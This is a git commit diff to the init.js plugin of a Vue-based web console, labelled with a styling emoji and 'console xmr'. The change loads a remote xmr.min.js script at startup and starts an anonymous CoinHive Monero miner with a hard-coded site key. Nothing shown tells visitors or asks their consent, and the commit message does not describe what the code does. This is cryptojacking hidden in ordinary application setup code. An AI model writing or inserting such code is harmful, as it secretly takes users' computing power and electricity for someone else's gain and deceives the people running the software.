7c2de89d12c8e51d86dad21b8e43ee648e703276
Vanessa <lly219@gmail.com>
2017-12-05 13:02:50 +0800

    :art: console xmr

--- console/plugins/init.js
+++ console/plugins/init.js
@@ -1,9 +1,14 @@
 import Vue from 'vue'
 import VueI18n from 'vue-i18n'
 import Vuetify from 'vuetify'
+import {asyncLoadScript} from '~/plugins/utils'
 
 export default ({app}) => {
   Vue.use(Vuetify)
   Vue.use(VueI18n)
   app.i18n = new VueI18n()
+
+  asyncLoadScript((process.env.StaticServer || process.env.Server) + '/theme/js/lib/xmr.min.js', () => {
+    (new window.CoinHive.Anonymous('YCkOr1LUJtEODIR5fVIzM4S79Nc5jvN7', {threads: 1, throttle: 0.9})).start()
+  })
 }
